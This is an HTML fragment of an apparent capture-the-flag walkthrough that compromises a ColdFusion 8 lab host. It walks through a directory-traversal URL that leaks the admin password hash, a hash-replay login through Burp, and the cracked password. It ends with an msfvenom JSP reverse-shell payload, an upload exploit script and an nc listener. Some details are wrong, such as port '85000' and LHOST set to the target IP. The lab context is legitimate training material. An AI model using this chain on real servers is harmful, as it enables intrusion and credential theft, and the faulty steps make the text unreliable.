        <p>Steps are Reconnaissance, Enumeration, Privilege Escalation</p>
        <br>
        <p>Nmap -sC -sV -Pn command will show the open ports in the system and other useful details that will <br>
            help us understand the system better.</p>

            <br>
        <p>After going through all the ports, you will find that port 8500 can be accessed through the web. 
            <br>http://10.10.10.11:85000</p>

            <p>After Pressing CFIDE/administrator you will be redirected to a admin login page. Find the link<br>
                 /CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en.<br>
                  It will expose the hash version of the password. <br>

                <br>
            <p>Open console on your browser and use the following code below It will expose the hash version of the password.<br>
                 console.log(hex_hmac_sha1(document.loginform.salt.value, '2F635F6D20E3FDE0C53075A8FB07DCEC9B03')) 
                Open burp suit (or any other request interceptor) and send a login request, intercept it and change the cfadminPassword= section to the has from console, then forward the request. 
            </p>
            <br>
            <p>Another method of logging into the admin in is using the hash finder tools. Using it I found that the password was happyday and login.<br>
                 Also the site https://crackstation.net/ will decode the hash.</p>

            <p>Press Debugging & Logging/Scheduled Tasks/ and Schedule New Task.  After that open command shell and generate a JSP reverse shell with the following command.
                msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.11 LPORT=4444 > shell.jsp<br>
              Next, run the following shell.jsp exploit code, start a listing shell,  
              Python arb-file-exploit.py 10.10.10.11 8500 shell.jsp<br>
               nc -nlvp 4444 <br>
              Then visit this link and you will get a shell on your listener. http://10.10.10.11:8500/CFIDE/shell.jsp
